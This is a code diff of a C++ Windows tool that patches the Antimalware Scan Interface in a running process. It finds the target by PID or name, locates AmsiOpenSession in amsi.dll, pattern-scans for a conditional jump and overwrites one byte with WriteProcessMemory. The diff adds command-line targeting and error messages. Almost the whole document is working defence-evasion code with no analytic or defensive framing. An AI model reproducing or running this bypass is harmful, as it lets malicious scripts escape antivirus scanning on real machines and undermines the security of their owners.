@@ -2,6 +2,7 @@
 #include <tlhelp32.h>
 #include <stdio.h>
 #include <iostream>
+#include <string>
 
 //00007FFAE957C650 | 48:85D2 | test rdx, rdx |
 //00007FFAE957C653 | 74 3F | je amsi.7FFAE957C694 |
@@ -30,7 +31,14 @@ GetPID(
 				Process32Next(hSnap, &pE);
 			do
 			{
-				if (!lstrcmpiW((LPCWSTR)pE.szExeFile, pn))
+				/*wchar_t wtext[260];
+				mbstowcs_s(wtext, pE.szExeFile, strlen(pE.szExeFile) + 1);
+				LPCWSTR ptr = wtext;*/
+				size_t size = strlen(pE.szExeFile) + 1;
+				wchar_t* targetProcessName = new wchar_t[size];
+				size_t outSize;
+				mbstowcs_s(&outSize, targetProcessName, size, pE.szExeFile, size - 1);
+				if (!lstrcmpiW(targetProcessName, pn))
 				{
 					procId = pE.th32ProcessID;
 					break;
@@ -71,28 +79,53 @@ searchPattern(
 int
 wmain() {
 	
+	int nArgs;
+	LPWSTR* szArglist;
+	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
+
 	BYTE pattern[] = { 0x48,'?','?', 0x74,'?',0x48,'?' ,'?' ,0x74,'?' ,0x48,'?' ,'?' ,'?' ,'?',0x74,0x33};
 
 	DWORD patternSize = sizeof(pattern);
 
-	DWORD tpid = GetPID(L"powershell.exe");
+	DWORD tpid = 0;
+	if (nArgs > 1) {
+		if (!wcscmp(L"-i", szArglist[1])) {
+			tpid = std::stoi(szArglist[2]);
+		}
+		if (!wcscmp(L"-p", szArglist[1])) {
+			tpid = GetPID((LPCWSTR)szArglist[2]);
+		}
+	}
+	else {
+		tpid = GetCurrentProcessId();
+	}
 
-	if (!tpid)
+	if (!tpid) {
+		printf("Couldn't get target pid. Exiting\n");
 		return -1;
+	}
+
+	printf("Target PID: %d\n", tpid);
 
 	HANDLE ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, tpid);
 
-	if (!ProcessHandle)
+	if (!ProcessHandle) {
+		printf("Could not get a handle on process: %d. Exiting.\n", tpid);
 		return (-1);
+	}
 
 	HMODULE hm = LoadLibraryA("amsi.dll");
-	if (!hm)
+	if (!hm) {
+		printf("Could not load amsi.dll. Exiting\n");
 		return(-1);
+	}
 
 	PVOID AmsiAddr = GetProcAddress(hm, "AmsiOpenSession");
 
-	if (!AmsiAddr)
+	if (!AmsiAddr) {
+		printf("Could not get address for AMSI. Exiting.\n");
 		return(-1);
+	}
 
 	printf("AMSI address %X\n",AmsiAddr);
 
@@ -106,12 +139,12 @@ wmain() {
 
 	updateAmsiAdress += matchAddress;
 
-	if (!WriteProcessMemory(ProcessHandle, (PVOID)updateAmsiAdress, patch, 1, 0))
-		return (-1);
+	if (!WriteProcessMemory(ProcessHandle, (PVOID)updateAmsiAdress, patch, 1, 0)) {
+		printf("Could not write to process memory. Exiting.\n");
+		return(-1);
+	}
 
 	printf("AMSI patched\n");
-
-	system("pause");
 
 	return 0;
 }
